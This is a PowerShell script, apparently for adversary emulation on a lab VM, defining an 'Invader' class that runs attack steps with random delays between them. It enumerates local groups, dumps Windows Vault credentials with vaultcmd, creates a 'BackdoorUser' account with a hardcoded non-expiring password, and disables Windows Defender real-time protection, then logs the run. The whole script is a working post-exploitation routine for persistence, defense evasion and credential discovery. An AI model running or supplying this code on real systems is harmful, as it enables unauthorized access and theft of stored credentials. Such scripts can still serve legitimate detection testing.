class Invader{
    
    [int32]$time

    Invader(){}
    # grab user
    [string] grabUser(){
        $unrefineduser = whoami.exe
        $userArr = $unrefineduser -split "\\"
        return $userArr[1]
    }
    # sleep for this amount of time
    sleep([int]$min, [int]$max){
        $this.time = Get-Random -Minimum $min -Maximum $max
        Start-Sleep -Seconds $this.time
    }

    # Disable Windows Defender
    disable_windows_defender() {
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction Stop
            "Windows Defender has been disabled."
        } catch {
            "Error: Unable to disable Windows Defender."
        }
    }

    create_backdoor_user() {
        try {
            $username = "BackdoorUser"
            $password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
            $user = New-LocalUser -Name $username -Password $password -FullName "Backdoor User" -Description "Backdoor Account" -AccountNeverExpires -PasswordNeverExpires -UserMayNotChangePassword -PasswordCannotChange
            "Backdoor user account created: $username"
        } catch {
            "Error: Unable to create backdoor user account."
        }
    }

    grab_localgroup(){
        net localgroup
    }

    grab_windows_vault(){
        vaultcmd /listcreds:"Windows Credentials" /all   
    }




}
# do stuff
$Invade = New-Object -TypeName Invader
$Invade.sleep(10,20)
$Invade.grab_localgroup()
$Invade.sleep(10,20)
$Invade.grab_windows_vault()
$Invade.sleep(10,20)
$Invade.create_backdoor_user()
$Invade.sleep(10,20)
$Invade.disable_windows_defender()

# Logging starts here
# Get VM unique identifier, current time, and script name
$vmID = (Get-WmiObject -Class Win32_ComputerSystem).Name
$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$scriptName = $MyInvocation.MyCommand.Name

# Define the path for the log file
$logPath = "C:\Users\User1\Desktop\logs\logFile.log"

# Format the log entry
$logEntry = "VM ID: $vmID, Time: $currentTime, Script: $scriptName"

# Write log entry to the log file
Add-Content -Path $logPath -Value $logEntry


Write-Host "Log file saved."